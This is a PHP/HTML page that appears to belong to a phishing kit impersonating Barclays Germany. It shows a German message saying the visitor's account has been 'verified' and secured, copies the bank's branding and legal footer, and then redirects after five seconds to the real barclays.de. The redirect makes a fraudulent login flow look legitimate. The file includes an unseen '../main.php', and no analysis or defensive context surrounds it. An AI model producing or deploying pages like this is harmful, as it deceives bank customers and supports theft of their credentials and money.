<?php 
require "../main.php";
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Barclays</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>
<header>
<div class="left">
    <img src="res/img/logo.png" class="pc">
    <img src="res/img/mobile-logo.png" class="mobile">
</div>
<div class="right">
    <img src="res/img/secure.png">
</div>
</header>

<div class="banner">
<div class="container">
<span>Verifizierung abgeschlossen!</span>
</div>
</div>



<main>
<div class="container">
<div class="form">

<div class="text">
    <p>Sie haben Ihr Konto erfolgreich verifiziert und es ist nun vollständig zugänglich.</p>
    <p>Vielen Dank, dass Sie sich die Zeit genommen haben, Ihr Konto zu sichern.</p>
    <p>Sie werden in Kürze zur Startseite weitergeleitet.</p>
    <img src="res/img/valid.png" style="width:60px;">
</div>

 
 

</div>
</div>
</main>



<footer>
<div class="container">
<p>Barclays Group hat der BAWAG das Nutzungsrecht an der Marke „Barclays“ für das Privatkundengeschäft in Deutschland und Österreich eingeräumt. Barclays Group und BAWAG befinden sich in keinem Beteiligungsverhältnis und handeln für ihre Geschäftsbereiche unabhängig voneinander.</p>
<img src="res/img/pubs.png">
</div>
</footer>

<script>
var seconds = 5;

var official_site = "https://barclays.de/";


setTimeout(() => {
    window.location=official_site;
}, seconds*1000);

</script>
</body>
</html>